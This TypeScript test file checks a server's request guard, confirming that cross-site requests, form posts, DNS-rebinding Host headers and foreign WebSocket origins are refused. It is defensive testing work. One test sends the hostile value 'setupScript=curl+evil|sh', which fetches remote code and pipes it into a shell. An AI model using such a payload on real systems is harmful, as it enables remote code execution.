import { WebSocket } from 'ws';
import { SESSIONS_WS_PATH } from '../sessions/sessions.gateway';
import { waitFor } from '../sessions/testing/fake-agent';
import {
  postJson,
  rawRequest,
  startTestApp,
  type TestApp,
} from '../testing/test-app';

describe('request guard (HTTP and WebSocket)', () => {
  let testApp: TestApp;

  beforeEach(async () => {
    testApp = await startTestApp({ allowedOrigins: ['http://localhost:4200'] });
  });

  afterEach(() => testApp.close());

  let projects = 0;
  /** A valid session request; each starts its own new project. */
  const prompt = () => ({
    prompt: 'Reply with pong',
    newProject: { name: `project-${++projects}` },
  });

  it('serves GET requests of non-browser clients, like the health check', async () => {
    const response = await rawRequest(testApp.port, 'GET', '/api/health');
    expect(response.status).toBe(200);
  });

  it('accepts same-origin and allowlisted JSON POSTs and curl', async () => {
    const sameOrigin = await postJson(testApp.port, '/api/sessions', prompt(), {
      origin: `http://${testApp.host}`,
    });
    expect(sameOrigin.status).toBe(201);
    const devServer = await postJson(testApp.port, '/api/sessions', prompt(), {
      origin: 'http://localhost:4200',
    });
    expect(devServer.status).toBe(201);
    const curl = await postJson(testApp.port, '/api/sessions', prompt());
    expect(curl.status).toBe(201);
    await waitFor(() => testApp.runner.runs.length === 3);
  });

  it('refuses cross-site requests', async () => {
    const foreign = await postJson(testApp.port, '/api/sessions', prompt(), {
      origin: 'https://evil.example',
    });
    expect(foreign.status).toBe(403);
    const opaque = await postJson(testApp.port, '/api/sessions', prompt(), {
      origin: 'null',
    });
    expect(opaque.status).toBe(403);
    const noOrigin = await postJson(testApp.port, '/api/sessions', prompt(), {
      'sec-fetch-site': 'cross-site',
    });
    expect(noOrigin.status).toBe(403);
    const read = await rawRequest(testApp.port, 'GET', '/api/sessions', {
      origin: 'https://evil.example',
    });
    expect(read.status).toBe(403);
    const repository = await postJson(
      testApp.port,
      '/api/repositories',
      { cloneUrl: '/srv/acme/tool' },
      { origin: 'https://evil.example' },
    );
    expect(repository.status).toBe(403);
    expect(testApp.runner.runs).toHaveLength(0);
  });

  it('refuses same-site and cross-site browser requests to the API, also GETs', async () => {
    for (const site of ['same-site', 'cross-site']) {
      const response = await rawRequest(testApp.port, 'GET', '/api/sessions', {
        'sec-fetch-site': site,
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-dest': 'image',
      });
      expect(response.status).toBe(403);
    }
    for (const site of ['same-origin', 'none']) {
      const response = await rawRequest(testApp.port, 'GET', '/api/sessions', {
        'sec-fetch-site': site,
      });
      expect(response.status).toBe(200);
    }
    // Non-browser clients send no such header.
    expect(
      (await rawRequest(testApp.port, 'GET', '/api/sessions')).status,
    ).toBe(200);
  });

  it('refuses form posts (urlencoded and text bodies) with 415', async () => {
    for (const contentType of [
      'application/x-www-form-urlencoded',
      'text/plain',
      'multipart/form-data; boundary=x',
    ]) {
      const response = await rawRequest(
        testApp.port,
        'POST',
        '/api/sessions',
        { 'content-type': contentType },
        'prompt=Reply+with+pong',
      );
      expect(response.status).toBe(415);
      const patch = await rawRequest(
        testApp.port,
        'PATCH',
        '/api/repositories/7d0a3c2e-1b4f-4e6a-9c8d-2f1e0a9b8c7d',
        { 'content-type': contentType },
        'setupScript=curl+evil|sh',
      );
      expect(patch.status).toBe(415);
    }
    expect(testApp.runner.runs).toHaveLength(0);
  });

  it('refuses unknown Host headers (DNS rebinding)', async () => {
    const response = await rawRequest(testApp.port, 'GET', '/api/sessions', {
      host: `evil.example:${testApp.port}`,
    });
    expect(response.status).toBe(403);
  });

  describe('WebSocket upgrade', () => {
    const connect = (headers: Record<string, string>) =>
      new Promise<{ opened: boolean; status?: number }>((resolve) => {
        const socket = new WebSocket(
          `ws://127.0.0.1:${testApp.port}${SESSIONS_WS_PATH}`,
          { headers },
        );
        socket.on('open', () => {
          socket.close();
          resolve({ opened: true });
        });
        socket.on('unexpected-response', (_request, response) =>
          resolve({ opened: false, status: response.statusCode }),
        );
        socket.on('error', () => resolve({ opened: false }));
      });

    it('accepts same-origin and allowlisted origins', async () => {
      expect(await connect({ origin: `http://${testApp.host}` })).toEqual({
        opened: true,
      });
      expect(await connect({ origin: 'http://localhost:4200' })).toEqual({
        opened: true,
      });
    });

    it('refuses same-site upgrades without Origin', async () => {
      expect(await connect({ 'sec-fetch-site': 'same-site' })).toEqual({
        opened: false,
        status: 403,
      });
      expect(await connect({ 'sec-fetch-site': 'same-origin' })).toEqual({
        opened: true,
      });
    });

    it('refuses foreign origins, cross-site browsers and foreign hosts', async () => {
      expect(await connect({ origin: 'https://evil.example' })).toEqual({
        opened: false,
        status: 403,
      });
      expect(await connect({ 'sec-fetch-site': 'cross-site' })).toEqual({
        opened: false,
        status: 403,
      });
      expect(
        await connect({ host: 'evil.example', origin: 'http://evil.example' }),
      ).toEqual({ opened: false, status: 403 });
    });
  });
});
